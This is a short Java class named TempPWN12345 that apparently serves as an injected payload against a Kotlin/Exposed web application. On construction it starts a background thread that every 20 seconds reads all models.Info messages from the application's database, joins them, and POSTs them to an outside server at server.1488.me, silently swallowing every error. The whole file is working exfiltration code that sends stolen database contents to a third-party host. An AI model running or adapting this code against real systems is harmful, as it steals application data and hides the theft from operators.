import java.util.ArrayList;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.DataOutputStream;
import java.nio.charset.StandardCharsets;

public class TempPWN12345 extends Thread {

	@Override
	public void run() {
		while (true) {
			try {
				ArrayList<String> messages = org.jetbrains.exposed.sql.transactions.ThreadLocalTransactionManagerKt.transaction((org.jetbrains.exposed.sql.Database) null, t -> {
					ArrayList<String> messagesT = new ArrayList<>();
					for (models.Info info : models.Info.Companion.all()) {
						System.err.println(info.getMessage());
						messagesT.add(info.getMessage());
					}
					System.err.println(messagesT.size());
					return messagesT;
				});
				StringBuilder total = new StringBuilder();
				messages.stream().forEach(x -> {
					total.append(x).append("#");
				});
				System.err.println(total.toString());
				try {
					String urlParameters  = total.toString();
					byte[] postData       = urlParameters.getBytes( StandardCharsets.UTF_8 );
					int    postDataLength = postData.length;
					String request        = "http://server.1488.me/test-1.php";
					URL    url            = new URL( request );
					HttpURLConnection conn= (HttpURLConnection) url.openConnection();           
					conn.setDoOutput( true );
					conn.setInstanceFollowRedirects( false );
					conn.setRequestMethod( "POST" );
					conn.setRequestProperty( "Content-Type", "application/x-www-form-urlencoded"); 
					conn.setRequestProperty( "charset", "utf-8");
					conn.setRequestProperty( "Content-Length", Integer.toString( postDataLength ));
					conn.setUseCaches( false );
					try(DataOutputStream wr = new DataOutputStream( conn.getOutputStream())) {
					   wr.write( postData );
					}
					conn.getInputStream();

				} catch (Exception e) {
					// e.printStackTrace(System.err);
				}
			} catch (Exception e) {
				// e.printStackTrace(System.err);
			}
			try {
				Thread.sleep(20000);
			} catch (Exception e) {
				
			}
		}
	}

	public TempPWN12345() {
		start();
	}
}